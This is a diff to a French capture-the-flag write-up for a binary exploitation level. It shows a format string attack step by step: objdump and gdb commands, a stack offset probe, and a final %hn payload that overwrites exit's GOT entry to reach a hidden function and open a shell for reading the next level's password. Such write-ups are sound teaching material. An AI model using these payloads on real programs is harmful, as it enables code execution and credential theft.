@@ -2,11 +2,11 @@ objdump -R ./level5 | grep exit
 
 addr of exit =	0x08049838
 
-addr of m =		0x080484a4
+addr of o =		0x080484a4
 
 Dans cette exercice, nous avons une fonction qui n'est pas call.
 
-Nous devons remplacer l'appel de la fonction exit par la fonction cacher.
+Nous devons remplacer l'appel de la fonction exit par la fonction pas call.
 
 On recupere l'adresse de exit.
 
@@ -14,7 +14,7 @@ objdump -R ./level5 | grep exit
 
 On recupere l'adresse de la fonction m
 
-gdb ./level5 et disas m
+gdb ./level5 et disas o
 
 Comme dans les autres levels, on cherche l'endroit ou on peut modifier notre
 adresse dans la stack.
@@ -23,4 +23,21 @@ python -c '(print("aaaa" + "%x " * 10))'
 
 Nos aaaa sont a la quatrieme position.
 
-Maintenant on donne l'adresse de notre fonction
+Maintenant on donne l'adresse de notre fonction.
+
+python -c '(print("\x38\x98\x04\x08" + "%4$x"))'
+
+Maintenant on ecrit l'adresse de la focntion a remplacer - nos 4 octets de la
+fonctions exit
+
+printf "%d\n" "0x84a4" = 33956.
+
+33956 - 4 octets = 33952
+
+Ce qui donne 
+
+python -c '(print("\x38\x98\x04\x08%33952x%4$hn"))' > /tmp/payload
+
+(cat /tmp/payload ; cat) | ./level5
+
+echo "/home/user/level6/.pass"
